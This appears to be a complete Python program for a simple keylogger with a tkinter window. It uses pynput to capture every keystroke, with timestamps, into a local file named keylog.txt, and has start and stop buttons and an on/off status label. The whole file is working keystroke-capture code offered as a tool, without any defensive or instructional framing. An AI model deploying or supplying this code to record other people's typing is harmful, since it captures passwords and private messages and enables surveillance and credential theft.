import tkinter as tk
from pynput import keyboard
import threading
import datetime

log_file = "keylog.txt"
listener = None  # Global listener variable
logging_active = False  # Status flag

# Key press handling
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key}\n")

# Start keylogger
def start_logging():
    global listener, logging_active
    if not logging_active:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        logging_active = True
        status_label.config(text="Logging: ON", fg="green")

# Stop keylogger
def stop_logging():
    global listener, logging_active
    if logging_active and listener:
        listener.stop()
        listener = None
        logging_active = False
        status_label.config(text="Logging: OFF", fg="red")

# GUI setup
root = tk.Tk()
root.title("Keylogger GUI")
root.geometry("300x150")
root.resizable(False, False)

tk.Label(root, text="Simple Keylogger", font=("Arial", 16)).pack(pady=10)

status_label = tk.Label(root, text="Logging: OFF", font=("Arial", 12), fg="red")
status_label.pack()

tk.Button(root, text="Start Logging", command=start_logging, bg="lightgreen").pack(pady=5)
tk.Button(root, text="Stop Logging", command=stop_logging, bg="tomato").pack(pady=5)

root.mainloop()
